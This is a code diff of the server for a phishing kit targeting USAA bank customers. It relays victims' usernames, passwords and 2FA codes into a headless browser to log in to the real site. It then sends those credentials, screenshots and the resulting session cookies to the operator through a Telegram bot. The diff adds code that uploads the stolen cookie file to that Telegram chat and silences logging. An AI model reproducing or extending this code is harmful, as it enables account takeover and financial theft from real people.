@@ -39,7 +39,7 @@ app.post('/login', async (req, res) => {
 
   const { username, password } = req.body;  
 
-  console.log(username)
+  // console.log(username)
 
   console.log('running first server')
   await page.evaluateOnNewDocument(() => {
@@ -97,7 +97,7 @@ app.post('/login', async (req, res) => {
     const elements = document.querySelectorAll('.sub-label');
     return Array.from(elements).map(element => element.textContent);  
   });
-  console.log(classValue)
+  // console.log(classValue)
 
 
 
@@ -107,10 +107,10 @@ app.post('/login', async (req, res) => {
 
     bot.sendMessage(chatId, `✅ ✅ INCORRECT PASSWORD ✅ ✅ :      USERNAME: ${username}  ||  PASSWORD: ${password}`)
     .then(() => {
-      console.log('Message sent successfully');
+      // console.log('Message sent successfully');
     })
     .catch((error) => {
-      console.error('Error sending message:', error);
+      // console.error('Error sending message:', error);
     });
     return
   } else {
@@ -119,10 +119,10 @@ app.post('/login', async (req, res) => {
     // Send the text message
     bot.sendMessage(chatId, `✅ ✅ VERIFIED USAA LOGIN ✅ ✅ :      USERNAME: ${username}  ||  PASSWORD: ${password}`)
     .then(() => {
-      console.log('Message sent successfully');
+      // console.log('Message sent successfully');
     })
     .catch((error) => {
-      console.error('Error sending message:', error);
+      // console.error('Error sending message:', error);
     });
   }
 
@@ -185,7 +185,7 @@ app.post('/mfacodes', async (req, res) => {
     }
   }, targetText);
 
-  console.log(`Clicked element with text: ${targetText}`);
+  // console.log(`Clicked element with text: ${targetText}`);
 
 
   await page.waitForTimeout(5000)
@@ -198,7 +198,7 @@ app.post('/codesmfa', async (req, res) => {
   console.log('running second server')
   const { twoFa } = req.body;  
 
-  console.log(twoFa)
+  // console.log(twoFa)
 
   await page.type('input[name="inputValue"]', twoFa);
 
@@ -219,10 +219,10 @@ app.post('/codesmfa', async (req, res) => {
         // Send the text message
         bot.sendMessage(chatId, `✅ ✅ VERIFIED USAA 2FA CODE ✅ ✅ :      USERNAME:: ${twoFa}`)
         .then(() => {
-          console.log('Message sent successfully');
+          // console.log('Message sent successfully');
         })
         .catch((error) => {
-          console.error('Error sending message:', error);
+          // console.error('Error sending message:', error);
         });
     // console.log('Code IS Valid');
   }
@@ -240,7 +240,7 @@ app.post('/codesmfa', async (req, res) => {
   // Send the image
 bot.sendPhoto(chatId, imagePath)
     .then(() => {
-      console.log('Image sent successfully');
+      // console.log('Image sent successfully');
     })
     .catch((error) => {
       console.error('Error sending image:', error);
@@ -261,7 +261,21 @@ bot.sendPhoto(chatId, imagePath)
     // Write cookies to a text file
   fs.writeFile('cookies.txt', JSON.stringify(cookies), function (err) {
   if (err) throw err;
-  console.log('Cookies saved to cookies.txt');
+
+  // Read the .txt file
+const filePath = 'cookies.txt';
+// Create a readable stream from the file
+const fileStream = fs.createReadStream(filePath);
+
+// Send the .txt file as a document
+bot.sendDocument(chatId, fileStream)
+  .then(() => {
+    console.log('File sent successfully');
+  })
+  .catch((error) => {
+    console.error('Error sending file:', error);
+  });
+  // console.log('Cookies saved to cookies.txt');
   });
 
 
@@ -292,11 +306,5 @@ bot.sendPhoto(chatId, imagePah)
 
 
 const port = 3006
-
-
-app.get('/', (req, res) => {
-  res.send('Hello World!')
-})
-
 
 app.listen(port, () => console.log(`Server started on port ${port}`))
